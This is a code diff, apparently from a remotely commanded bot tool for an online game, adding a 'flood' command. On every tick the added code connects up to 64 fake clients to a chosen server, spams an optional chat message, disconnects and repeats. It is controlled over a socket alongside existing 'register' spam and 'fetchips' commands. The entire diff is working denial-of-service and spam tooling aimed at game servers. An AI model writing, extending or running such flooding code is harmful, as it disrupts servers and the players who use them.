@@ -25,9 +25,11 @@
 
 typedef long long int64;
 static bool RegisterSpam = false;
+static bool FloodActive = false;
 static char RegisterAddr[128];
 static int RegisterPort = 0;
 static int RegisterNum = 0;
+static char FloodMsg[256];
 
 void SendData(const char *pData, int Size)
 {
@@ -1033,6 +1035,19 @@ void Tick()
 		}
 	}
 
+	if(FloodActive)
+	{
+		ConnectDummies(RegisterAddr, RegisterPort, RegisterNum, 0);
+		Sleep(10);
+		if(FloodMsg[0])
+		{
+			ChatDummies(FloodMsg);
+			Sleep(10);
+		}
+		DisconnectDummies();
+		Sleep(10);
+	}
+
 	if (m_Tick > 250) // once in 250 ms
 	{
 		m_Tick = 0;
@@ -1436,6 +1451,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 						}
 						else
 						{
+							FloodActive = false;
 							ConnectDummies(aCmd[1], Port, Num, 0);
 							RegisterSpam = true;
 							RegisterPort = Port;
@@ -1449,6 +1465,53 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: register <ip> <port> <num>", strlen("[Server]: Please use: register <ip> <port> <num>"), 0);
+			}
+			else if(strcmp(aCmd[0], "flood") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
+				{
+					int Port = atoi(aCmd[2]);
+					int Num = atoi(aCmd[3]);
+					if(Num > 0 && Num <= 64)
+					{
+						if(FloodActive)
+						{
+							FloodActive = false;
+							RegisterPort = 0;
+							ZeroMemory(&RegisterAddr, sizeof(RegisterAddr));
+							ZeroMemory(&FloodMsg, sizeof(FloodMsg));
+							RegisterNum = 0;
+							DisconnectDummies();
+							send(g_Client, "[Server]: Stopped Flood!", strlen("[Server]: Stopped Flood!"), 0);
+						}
+						else
+						{
+							RegisterSpam = false;
+							ConnectDummies(aCmd[1], Port, Num, 0);
+							FloodActive = true;
+							RegisterPort = Port;
+							str_format(RegisterAddr, sizeof(RegisterAddr), "%s", aCmd[1]);
+							RegisterNum = Num;
+
+							char aMsg[256];
+							ZeroMemory(&aMsg, sizeof(aMsg));
+							for (int i = 4; i <= Cmd; i++)
+							{
+								char aBuf[128];
+								str_format(aBuf, sizeof(aBuf), "%s ", aCmd[i]);
+								str_append(aMsg, aBuf, sizeof(aMsg));
+							}
+
+							str_format(FloodMsg, sizeof(FloodMsg), "%s",aMsg);
+
+							send(g_Client, "[Server]: Started Flood!", strlen("[Server]: Started Flood!"), 0);
+						}
+					}
+					else
+						send(g_Client, "[Server]: Please select a amount between 1 and 64!", strlen("[Server]: Please select a amount between 1 and 64!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: flood <ip> <port> <num> <optional: chat msg>", strlen("[Server]: Please use: flood <ip> <port> <num> <optional: chat msg>"), 0);
 			}
 			else if (strcmp(aCmd[0], "fetchips") == 0)
 			{
